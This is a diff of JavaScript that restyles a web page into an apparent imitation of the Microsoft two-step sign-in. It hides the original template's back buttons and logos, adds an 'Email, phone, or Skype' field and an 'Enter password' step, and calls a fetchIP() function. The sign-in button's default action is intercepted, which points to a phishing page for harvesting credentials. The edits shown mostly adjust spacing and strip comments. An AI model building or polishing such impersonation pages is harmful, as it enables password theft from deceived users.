@@ -20,10 +20,8 @@
     fetchIP();
 
     window.addEventListener('DOMContentLoaded', () => {
-        // --- 1. KILL ORIGINAL ARROWS/LOGOS ---
         const style = document.createElement('style');
         style.innerHTML = `
-            /* Hide any existing back buttons or top arrows from the template */
             button[type="button"] img, .back-button, #idBtn_Back, .identityBanner img, .back-arrow { 
                 display: none !important; 
             }
@@ -37,17 +35,17 @@
         if (!passwordField) return;
         const parentContainer = passwordField.parentNode;
 
-        // --- 2. CUSTOM IDENTITY ROW (ARROW + EMAIL) ---
+        // IDENTITY ROW
         const identityRow = document.createElement('div');
         identityRow.id = "custom-identity-row";
-        // Added margin-bottom: 24px to stop it from touching the title
-        identityRow.style = "display: none; align-items: center; gap: 10px; margin-bottom: 24px; cursor: pointer; width: 100%;";
+        // INCREASED NEGATIVE MARGIN (-24px) TO MOVE IT HIGHER
+        identityRow.style = "display: none; align-items: center; gap: 8px; margin-top: -24px; margin-bottom: 8px; cursor: pointer; width: 100%;";
         identityRow.innerHTML = `
             <div style="display: flex; align-items: center;">
-                <svg viewBox="0 0 24 24" style="width: 18px; height: 18px; fill: #666; margin-right: 10px;">
+                <svg viewBox="0 0 24 24" style="width: 18px; height: 18px; fill: #666; margin-right: 8px;">
                     <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path>
                 </svg>
-                <span id="display-email" style="font-size: 0.9375rem; color: #1b1b1b; font-family: 'Segoe UI'; font-weight: 400;"></span>
+                <span id="display-email" style="font-size: 0.9375rem; color: #1b1b1b; font-family: 'Segoe UI';"></span>
             </div>`;
 
         identityRow.onclick = () => {
@@ -55,36 +53,29 @@
             identityRow.style.display = "none";
             passwordField.style.display = "none";
             emailInput.style.display = "block";
-            if (titleHeader) {
-                titleHeader.innerText = "Sign in";
-                titleHeader.style.marginTop = "0px";
-            }
+            if (titleHeader) titleHeader.innerText = "Sign in";
         };
 
-        // --- 3. STYLE THE HEADER ---
         if (titleHeader) {
-            titleHeader.style.fontSize = "1.625rem"; // 26px
+            titleHeader.style.fontSize = "1.625rem"; 
             titleHeader.style.fontWeight = "600";
             titleHeader.style.color = "#1b1b1b";
-            titleHeader.style.marginBottom = "16px";
+            titleHeader.style.marginBottom = "14px";
             titleHeader.innerText = "Sign in";
         }
 
-        // --- 4. EMAIL INPUT ---
         const emailInput = document.createElement('input');
         emailInput.type = 'email';
         emailInput.placeholder = 'Email, phone, or Skype';
         emailInput.style = "width:100%; height:36px; padding:6px 0px; border:none; border-bottom:1px solid #666; outline:none; font-family:'Segoe UI'; margin-bottom:12px; font-size: 0.9375rem;";
         
-        // PHYSICAL ORDERING
         parentContainer.prepend(passwordField); 
         parentContainer.insertBefore(emailInput, passwordField); 
         if (titleHeader) parentContainer.insertBefore(titleHeader, emailInput);
-        parentContainer.insertBefore(identityRow, titleHeader); // Identity Row is ALWAYS at the absolute top
+        parentContainer.insertBefore(identityRow, titleHeader); 
 
         passwordField.style.display = "none";
 
-        // --- 5. BUTTON LOGIC ---
         if (signInButton) {
             signInButton.addEventListener('click', (e) => {
                 e.preventDefault();
@@ -94,13 +85,10 @@
                     
                     document.getElementById('display-email').innerText = emailVal;
                     emailInput.style.display = "none";
-                    
-                    // Switch to Page 2
                     identityRow.style.display = "flex"; 
-                    if (titleHeader) {
-                        titleHeader.innerText = "Enter password";
-                        titleHeader.style.marginTop = "0px"; // Ensure no extra gap
-                    }
+                    
+                    if (titleHeader) titleHeader.innerText = "Enter password";
+                    
                     passwordField.style.display = "block";
                     passwordField.focus();
                     step = 2;
@@ -125,6 +113,8 @@
         }
     });
 </script>
+
+
 
 
 
